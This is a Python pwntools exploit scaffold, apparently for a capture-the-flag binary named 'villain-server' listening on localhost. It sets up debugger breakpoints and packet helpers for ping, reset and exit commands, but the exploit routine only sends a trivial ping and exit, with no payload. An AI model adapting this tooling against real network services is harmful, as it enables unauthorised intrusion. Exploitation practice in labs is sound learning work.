#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './villain-server'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '127.0.0.1', 7331

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# recv frame size
breakrva 0xBAB0

# recv payload
breakrva 0xC82E
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
PING = 0x0
RESET = 0x1
EXIT = 0x4

def send_instructions(code, payload):
    packet = p8(0x1) + p8(code) + payload
    io.send(packet)

def ping(size, payload):
    payload = p16(size) + payload
    send_instructions(PING, payload)

def reset():
    send_instructions(RESET, b'\x00')

def quit():
    send_instructions(EXIT, b'\x00')

def exploit():
    global io
    io = initialize()
    
    ping(0x1, b'a')

    quit()

    io.interactive()
    
if __name__ == '__main__':
    exploit()
